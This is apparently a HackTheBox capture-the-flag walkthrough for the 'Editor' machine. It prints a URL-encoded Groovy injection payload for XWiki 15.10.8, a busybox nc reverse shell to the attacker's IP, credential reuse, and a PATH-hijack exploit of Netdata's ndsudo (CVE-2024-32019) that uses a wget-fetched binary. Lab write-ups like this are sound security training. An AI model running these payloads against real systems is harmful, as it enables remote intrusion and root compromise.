---
title: Editor — HackTheBox Full Walkthrough
date: 2025-12-22 12:00:00 +0500
image:
    path: "https://miro.medium.com/v2/resize:fit:1066/format:webp/1*NkkbO26BTt4uTt35A_J21Q.png"
    alt: Editor Cover Image
toc: true
comments: true
tags: hacking ctf hackthebox
categories: ["Capture The Flag"]
description: Read full walkthrough of Editor from HackTheBox.
---


Today, we will hack [Editor](https://app.hackthebox.com/machines/Editor) from **HackTheBox**. It’s created by [Kavigihan](https://app.hackthebox.com/users/389926) & [TheCyberGeek](https://app.hackthebox.com/users/114053).

Compromise Overview
-------------------

The exploitation of the machine involves a vulnerable **XWiki** instance running on port **8080**, which allows **Remote Code Execution (RCE)** and enables us to obtain a reverse shell on the system. A plaintext password then leads to user takeover. This user is part of the **NetData** group, revealing a privilege escalation path that ultimately allows us to obtain **root** privileges on the target machine.

Enumerating The Target
----------------------

As always, we will start by enumerating our target with [nmap](https://nmap.org/).

```shell
┌──(root㉿kali)
└─# nmap 10.10.11.80 --open -sC -sV 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-06 11:51 EST
Nmap scan report for 10.10.11.80
Host is up (0.17s latency).
Not shown: 989 closed tcp ports (reset), 8 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
|_http-server-header: Jetty(10.0.20)
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: Jetty(10.0.20)
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.13 seconds
```
{: .nolineno}

The nmap scan revealed three open ports: 22 SSH, Nginx 1.18.0 Web Server on 80, and Jetty 10.0.20 on port 8080.

80 — Nginx 1.18.0
-----------------

The landing page on port 80 is about a futuristic code editor with a download button. The download file extension is `.deb`

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qR1sKEVytalvOnHWFqOfPg.png)

I downloaded the Debian package and installed it.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uSG0uwy1pZuAjUV0ol3sDA.png)

I launched the editor, looked around, tried running some Python scripts, and decided to move on with other options because this seems like a rabbit hole.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*h4AiTAMvGXmm9bodstPKSA.png)

8080 — Jetty XWIKI 10.0.20
--------------------------

Port **8080** is hosting a Wiki for the **SimplelistCode** application.

> [XWiki](https://en.wikipedia.org/wiki/XWiki) is _a light and powerful development platform_ that allows you to customize the wiki to your specific needs.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZfFQPxR5CQcd4ynt8aUDjg.png)

The login panel screenshot below reveals the version number of XWiki `15.10.8`.

![Vulnerable XWIKI Instance 15.10.8](https://miro.medium.com/v2/resize:fit:1012/format:webp/1*JyI4OfxX-9JFcN05pj1Wxg.png)

A quick Google search against this version revealed that it’s vulnerable to Remote Code Execution (RCE). It can be found [here](https://github.com/advisories/GHSA-rr6p-3pfg-562j). This vulnerability has been patched in **XWiki** `15.10.11`, `16.4.1`, and `16.5.0RC1`.

We can use the following URL-encoded POC to verify if the target’s XWIKI version is vulnerable.

```shell
<host>/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28"Hello%20from"%20%2B%20"%20search%20text%3A"%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20
```
{: .nolineno}

If there is an output, and the title of the RSS feed contains `Hello from search text:42`, then the instance is vulnerable.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y2fBuZp4sNF2yutBkwQTmQ.png)

The POC is using the SolrSearchMacros request to execute the command on the target system.

### Revers Shell

We will use the busybox reverse shell command from [revshells.com](https://www.revshells.com/).

```shell
busybox nc {tun0-ip} {port} -e sh
```
{: .nolineno}

I placed the reverse shell in POC and URL-encoded it.

```shell
http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22busybox%20nc%2010.10.14.123%204444%20-e%20sh%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
```
{: .nolineno}

We successfully received a shell. I’m using Penelope.

> [Penelope](https://github.com/brightio/penelope) is a powerful shell handler built as a modern netcat replacement for RCE exploitation, aiming to simplify, accelerate, and optimize post-exploitation workflows.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JjT25xWCzk0k2aVQ9HR-8Q.png)

Privilege Escalation — User
---------------------------

I started enumerating the files for plaintext passwords using grep and found a password in `hibernate.xml` file.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NWYuPvyGheVIcKBoNMJhcQ.png)

Upon reading the same file further, I found that these credentials are for a MySQL instance.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5ZtGUFItHFN626tEiEyEtg.png)

I logged into MySQL and tried looking for more passwords, but did not find anything. I then tried the same credentials for user Olivia over SSH, and it worked.

```shell
oliver@editor:~$ cat user.txt 
{flag-redacted}
```
{: .nolineno}

Privilege Escalation — Root
---------------------------

Upon checking user groups, I found the current user is part of the Netdata group.

```shell
oliver@editor:/tmp/fakebin$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```
{: .nolineno}

A quick Google search exposed that this is vulnerable to privilege escalation. We will use this [POC](https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation) from [dollarboysushil](https://github.com/dollarboysushil).

> A Python-based exploit for **CVE-2024–32019**, a high-severity Local Privilege Escalation vulnerability in the **Netdata Agent**, leveraging a misconfigured SUID binary (`ndsudo`) that fails to securely handle the `PATH` environment variable.

The commands bellow shows the exploitation process.

```shell
oliver@editor:~$ mkdir -p /tmp/fakebin
oliver@editor:~$ cd /tmp
oliver@editor:/tmp$ cd fakebin/
oliver@editor:/tmp/fakebin$ wget http://10.10.14.123/nvme
--2025-11-08 11:32:46--  http://10.10.14.123/nvme
Connecting to 10.10.14.123:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16056 (16K) [application/octet-stream]
Saving to: ‘nvme’
nvme                             100%[=======================================================>]  15.68K  --.-KB/s    in 0.1s    
2025-11-08 11:32:47 (119 KB/s) - ‘nvme’ saved [16056/16056]
oliver@editor:/tmp/fakebin$ chmod +x nvme
oliver@editor:/tmp/fakebin$ export PATH=/tmp/fakebin:$PATH
oliver@editor:/tmp/fakebin$ which nvme
/tmp/fakebin/nvme
oliver@editor:/tmp/fakebin$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
root@editor:/tmp/fakebin# whoami
root
root@editor:/tmp/fakebin#
```
{: .nolineno}

We [successfully](https://labs.hackthebox.com/achievement/machine/894352/684) compromised the system and obtained root privileges.

**Closing Notes**
-----------------

For this machine, the approach was straightforward. We focused on proper enumeration and used the identified information and version numbers to guide further research. This process directly led to root access. The machine clearly reinforces how critical enumeration is careful observation and attention to anything unusual or out of place can make all the difference.

Feel free to reach out if you have any questions.